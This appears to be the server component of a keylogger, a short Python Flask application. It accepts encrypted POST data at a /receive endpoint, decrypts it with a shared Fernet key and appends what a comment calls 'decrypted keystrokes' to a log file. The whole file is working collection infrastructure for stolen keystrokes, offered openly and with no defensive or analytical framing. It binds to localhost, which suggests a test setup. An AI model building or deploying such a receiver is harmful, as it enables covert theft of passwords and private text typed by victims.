from flask import Flask, request
from cryptography.fernet import Fernet
import base64

# Load the same secret key
with open("secret.key", "rb") as key_file:
    secret_key = key_file.read()

fernet = Fernet(secret_key)

app = Flask(__name__)

@app.route("/receive", methods=["POST"])
def receive_data():
    try:
        data = request.json.get("data")
        encrypted_data = base64.b64decode(data)
        decrypted_data = fernet.decrypt(encrypted_data).decode()

        # Write decrypted keystrokes continuously into a log file
        with open("server_log.txt", "a") as f:
            f.write(decrypted_data)

        return {"status": "success"}, 200
    except Exception as e:
        return {"status": "error", "message": str(e)}, 400

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000)
